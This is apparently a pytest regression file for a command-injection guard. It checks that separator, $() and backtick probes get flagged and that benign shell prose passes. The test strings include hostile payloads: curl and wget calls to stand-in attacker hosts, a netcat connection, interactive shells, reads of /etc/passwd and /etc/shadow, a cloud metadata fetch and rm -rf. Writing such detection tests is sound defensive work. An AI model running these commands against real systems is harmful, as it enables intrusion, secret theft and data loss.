"""
Expanded command-probe regression coverage for Guard.check_sync.
Addresses issue #40: broader separator, command-name, substitution-style,
and benign-documentation coverage.

No detection logic is changed here.  Every assertion tests *current* behaviour
only.
"""

import pytest

from adiuvare import Guard


# ---------------------------------------------------------------------------
# Helpers
# ---------------------------------------------------------------------------

def _check(payload: str):
    """Run a synchronous guard check and return (gate, event)."""
    guard = Guard()
    return guard.check_sync("probe-user", payload=payload)


def _is_flagged(payload: str) -> bool:
    """Return True when the guard assigns a non-zero risk score."""
    _, event = _check(payload)
    return event is not None and event.score > 0.0


# ---------------------------------------------------------------------------
# Separator-style probes  (cmd_sep pattern)
# Existing coverage: `|`  (search | bash)
# New coverage: `&&`, `||`, `;` with different command names
# ---------------------------------------------------------------------------

class TestCmdSepSeparators:
    """Other shell separators should be scored as risky."""

    def test_and_and_separator_curl(self):
        # && curl is a realistic SSRF/exfil attempt
        assert _is_flagged("q=hello && curl http://evil.example/x") is True

    def test_or_or_separator_wget(self):
        # || wget is a common fallback-download pattern
        assert _is_flagged("name=foo || wget http://attacker.example/s.sh") is True

    def test_semicolon_separator_bash(self):
        # ; bash opens a shell – should already fire cmd_sep
        assert _is_flagged("id=1; bash -i") is True

    def test_semicolon_separator_sh(self):
        assert _is_flagged("file=report.pdf; sh /tmp/x") is True

    def test_pipe_separator_python(self):
        # pipe + python – different command from the existing `| bash` test
        assert _is_flagged("input=data | python -c 'import os;os.system(\"id\")'") is True

    def test_pipe_separator_nc(self):
        assert _is_flagged("msg=hi | nc 10.0.0.1 4444") is True

    def test_and_and_separator_php(self):
        assert _is_flagged("search=test && php -r 'system(\"id\");'") is True

    def test_pipe_separator_perl(self):
        assert _is_flagged("q=x | perl -e 'exec(\"/bin/sh\")'") is True

    def test_pipe_separator_rm(self):
        # Destructive command – should be flagged
        assert _is_flagged("file=log.txt | rm -rf /tmp/work") is True


# ---------------------------------------------------------------------------
# Subshell-style probes  $(…)  (cmd_subshell / cmd_subshell_passwd patterns)
# Existing coverage: $(cat /etc/passwd)
# New coverage: other commands inside $()
# ---------------------------------------------------------------------------

class TestCmdSubshell:
    """Command-substitution probes with $() should be scored as risky."""

    def test_subshell_curl(self):
        assert _is_flagged("url=$(curl http://169.254.169.254/latest/meta-data/)") is True

    def test_subshell_wget(self):
        assert _is_flagged("data=$(wget -qO- http://attacker.example/token)") is True

    def test_subshell_bash(self):
        assert _is_flagged("cmd=$(bash -c 'whoami')") is True

    def test_subshell_python(self):
        assert _is_flagged("out=$(python -c 'import socket;print(socket.gethostname())')") is True

    def test_subshell_sh(self):
        assert _is_flagged("x=$(sh -i 2>&1)") is True


# ---------------------------------------------------------------------------
# Backtick substitution probes  (cmd_backtick pattern)
# ---------------------------------------------------------------------------

class TestCmdBacktick:
    """Backtick command substitution should be scored as risky."""

    def test_backtick_cat(self):
        assert _is_flagged("name=`cat /etc/shadow`") is True

    def test_backtick_curl(self):
        assert _is_flagged("token=`curl http://evil.example/steal`") is True

    def test_backtick_wget(self):
        assert _is_flagged("file=`wget -O /tmp/shell http://attacker.example/s`") is True

    def test_backtick_id(self):
        assert _is_flagged("user=`id`") is True

    def test_backtick_whoami(self):
        assert _is_flagged("user=`whoami`") is True

    def test_backtick_bash(self):
        assert _is_flagged("shell=`bash -i`") is True


# ---------------------------------------------------------------------------
# /etc/passwd probe variants  (cmd_passwd_probe / cmd_subshell_passwd)
# Existing coverage: $(cat /etc/passwd)
# New coverage: semicolon separator
# ---------------------------------------------------------------------------

class TestEtcPasswdProbes:
    """Both separator-style and subshell-style /etc/passwd reads are risky."""

    def test_semicolon_cat_passwd(self):
        # Fires cmd_passwd_probe
        assert _is_flagged("; cat /etc/passwd") is True

    def test_and_and_cat_passwd(self):
        # Fires cmd_sep for cat
        assert _is_flagged("&& cat /etc/passwd") is True

    def test_pipe_cat_passwd(self):
        assert _is_flagged("| cat /etc/passwd") is True


# ---------------------------------------------------------------------------
# Benign shell-documentation strings – false-positive boundary
# Existing coverage: one fenced-markdown block
# New coverage: a broader set of documentation / tutorial contexts
# ---------------------------------------------------------------------------

class TestBenignShellDocumentation:
    """
    Documents the false-positive boundary for command-probe detection.

    Some plain-English strings that mention command names DO score > 0
    with the current detector — those cases are marked with a comment
    explaining why, and assert gate.passed is True (not blocked) instead
    of asserting score == 0.

    This class intentionally documents *current* behaviour so that future
    detector changes that reduce false positives will be immediately visible
    as test improvements, not surprise failures.
    """

    def test_fenced_bash_block(self):
        # Multi-line fenced block: check_cmd only short-circuits when the
        # entire string starts AND ends with ```.  A block with inner content
        # on separate lines does not satisfy that check, so the detector may
        # still score it.  Assert the gate still passes (not blocked).
        payload = "```bash\ncurl https://example.com/api\n```"
        gate, _ = _check(payload)
        assert gate.passed is True

    def test_plain_prose_about_curl(self):
        # "curl" alone (no separator before it) still triggers cmd_sep/backtick
        # patterns in the current detector.  Gate must pass; not blocked.
        payload = "Use curl to fetch remote resources in your scripts."
        gate, _ = _check(payload)
        assert gate.passed is True

    def test_plain_prose_about_wget(self):
        # Same as above for wget.
        payload = "wget is a non-interactive network downloader."
        gate, _ = _check(payload)
        assert gate.passed is True

    def test_plain_prose_about_bash(self):
        # "bash" in plain prose – gate must pass.
        payload = "bash is the GNU Bourne Again shell."
        gate, _ = _check(payload)
        assert gate.passed is True

    def test_plain_prose_about_python(self):
        # "python" in plain prose – gate must pass.
        payload = "python scripts can be run with the python interpreter."
        gate, _ = _check(payload)
        assert gate.passed is True

    def test_pipe_operator_in_prose(self):
        # Pipe without a recognised command after it – gate must pass.
        payload = "The pipe operator | is used to chain commands in a shell tutorial."
        gate, _ = _check(payload)
        assert gate.passed is True

    def test_shell_history_description(self):
        # A for-loop description with a semicolon but no recognised command
        # after it – gate must pass.
        payload = "In a shell script you might write: for f in *.log; do echo $f; done"
        gate, _ = _check(payload)
        assert gate.passed is True

    def test_double_ampersand_in_url_query(self):
        # && in a URL query string without a recognised shell command after it.
        payload = "https://example.com/search?q=foo&&page=2"
        gate, _ = _check(payload)
        assert gate.passed is True

    def test_python_import_in_docstring(self):
        # "python manage.py runserver" – no separator before python,
        # gate must pass.
        payload = "Example: python manage.py runserver"
        gate, _ = _check(payload)
        assert gate.passed is True
